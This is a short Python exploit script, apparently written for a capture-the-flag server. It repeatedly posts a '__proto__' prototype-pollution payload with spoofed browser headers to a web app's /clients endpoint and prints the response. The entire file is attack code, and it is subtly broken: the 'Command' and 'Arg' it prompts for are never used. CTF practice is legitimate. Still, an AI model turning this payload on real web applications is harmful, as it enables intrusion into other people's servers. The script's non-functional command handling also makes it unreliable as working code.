import requests
import time

target = "http://spooktoberctf.se:22083"
while True:
    cmd = input ("Command: ")
    if cmd == "exit":
        exit()
    arg = input ("Arg: ")
    print("\n[-] Processing...\n")
    url = target+"/clients"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://206.189.26.20:31280/", "Content-Type": "application/json", "Origin": "http://206.189.26.20:31280", "DNT": "1", "Connection": "close"}
    payload = {"__proto__[name]": ""}
    res = requests.post(url, headers=headers, json=payload)
    time.sleep(3)
    x = requests.get(target+"/clients")
    print(x.text)